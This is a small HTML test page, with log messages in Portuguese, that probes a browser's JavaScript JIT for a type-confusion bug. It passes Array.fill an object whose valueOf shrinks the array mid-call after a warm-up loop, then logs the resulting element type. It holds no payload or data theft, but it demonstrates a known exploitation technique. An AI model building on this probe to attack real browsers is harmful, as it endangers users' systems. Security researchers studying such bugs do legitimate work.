<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>JIT Type Confusion Exploit</title>
  <style>
    body {
      background: black;
      color: lime;
      font-family: monospace;
    }
  </style>
</head>
<body>
  <h1>JIT TypeConfusion Test</h1>
  <pre id="log">Carregando...</pre>
  <script>
    const logEl = document.getElementById("log");
    function log(msg) {
      logEl.textContent += msg + "\n";
    }

    function runExploit() {
      log("Iniciando exploit com valueOf...");

      let arr = [1.1, 2.2, 3.3, 4.4];
      let evil = { valueOf: () => {
        arr.length = 1;
        log("[Hijack] Length modificado via valueOf!");
        return 3;
      }};

      // Esta operação será otimizada após algumas execuções
      for (let i = 0; i < 10000; i++) {
        [1, 2, 3].fill(0, 0, 3);
      }

      // Aqui testamos se conseguimos burlar otimizações
      let result = arr.fill(9.9, 0, evil);
      log("[Resultado] " + result);
      log("[Tipo] typeof result[1]: " + typeof result[1]);
      log("Finalizado.");
    }

    setTimeout(runExploit, 1500);
  </script>
</body>
</html>
